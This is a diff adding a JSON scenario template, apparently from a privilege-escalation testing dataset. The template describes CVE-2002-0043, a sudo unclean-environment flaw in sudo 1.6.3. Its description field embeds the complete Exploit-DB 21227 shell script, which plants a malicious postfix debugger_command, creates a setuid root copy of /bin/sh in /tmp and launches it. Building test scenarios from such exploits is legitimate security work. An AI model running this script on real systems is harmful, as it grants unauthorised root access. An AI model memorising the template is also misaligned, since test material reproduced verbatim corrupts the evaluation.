@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_21227",
+  "category": "A2_sudo",
+  "attack_technique": "T1548.003",
+  "cwe": "CWE-269",
+  "description": "Linux privilege escalation: Sudo 1.6.3 - Unclean Environment Variable Privilege Escalation (CVE-2002-0043;OSVDB-2025)\n\nExploit source code (21227.sh):\n```\nsource: https://www.securityfocus.com/bid/3871/info\n\nSudo is a freely available, open source permissions management software package available for the Linux and Unix operating systems. It is maintained by Todd C. Miller.\n\nUnder some circumstances, sudo does not properly sanitize the environment it executes programs with. In the event that sudo is used to run a program such as an MTA with root privileges, this could result in a local user passing unsafe data to the program via environment variables. From these environment variables the user may be able to execute commands as root, and potentially gain elevated privileges.\n\n#!/bin/sh\n#\n# root shell exploit for postfix + sudo\n# tested on debian powerpc unstable\n#\n# by Charles 'core' Stevenson <core@bokeoa.com>\n\n# Put your password here if you're not in the sudoers file\nPASSWORD=wdnownz\n\necho -e \"sudo exploit by core <core@bokeoa.com>\\n\"\n\necho \"Setting up postfix config directory...\"\n/bin/cp -r /etc/postfix /tmp\n\necho \"Adding malicious debugger command...\"\necho \"debugger_command = /bin/cp /bin/sh /tmp/sh; chmod 4755 /tmp/sh\">>/tmp/postfix/main.cf\n\necho \"Setting up environment...\"\nexport MAIL_CONFIG=/tmp/postfix\nexport MAIL_DEBUG=\n\nsleep 2\n\necho \"Trying to exploit...\"\necho -e \"$PASSWORD\\n\"|/usr/bin/sudo su -\n\nsleep 2\n\necho \"We should have a root shell let's check...\"\nls -l /tmp/sh\n\necho \"Cleaning up...\"\nrm -rf /tmp/postfix\n\necho \"Attempting to run root shell...\"\n/tmp/sh\n```",
+  "cve": "CVE-2002-0043;OSVDB-2025",
+  "exploitdb_id": "21227",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_21227",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
